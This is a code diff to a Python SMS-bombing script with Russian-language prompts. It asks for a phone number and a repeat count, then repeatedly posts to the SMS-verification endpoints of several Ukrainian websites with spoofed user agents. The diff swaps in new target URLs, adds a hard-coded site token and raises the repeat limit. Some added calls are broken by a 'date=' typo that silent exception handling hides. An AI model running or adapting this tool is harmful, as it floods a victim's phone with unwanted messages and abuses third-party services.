@@ -43,23 +43,33 @@ console.print("[purple]Введите номер телефонa (без +): ")
 
 number = console.input("[blue]spammer>> ")
 
-run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))
+run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
 
 def ukr():
         for _ in track(range(run)):
                 headers = {"User-Agent": fake_useragent.UserAgent().random}
                 try:
-                        requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
+                         requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers)
                 except:
                         pass
                 try:
-                        requests.post("https://md-fashion.com.ua/bpm/validate-contact", data={"phone": "+" + number}, headers=headers)
+                         requests.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode ", json={"phone": "+" + number}, headers=headers)
                 except:
                         pass
                 try:
-                        requests.post("https://md-fashion.com.ua/bpm/validate-contact", json={"phone": "+" + number}, headers=headers)
+                         requests.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode ", json={"phone": number}, headers=headers)
                 except:
                         pass
+                try:
+                         requests.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode ", date={"phone": "+" + number}, headers=headers)
+                except:
+                        pass
+                try:
+                         requests.post("https://api.creditkasa.ua/public/auth/sendAcceptanceCode ", date={"phone": number}, headers=headers)
+                except:
+                        pass
+
+
 
 
 
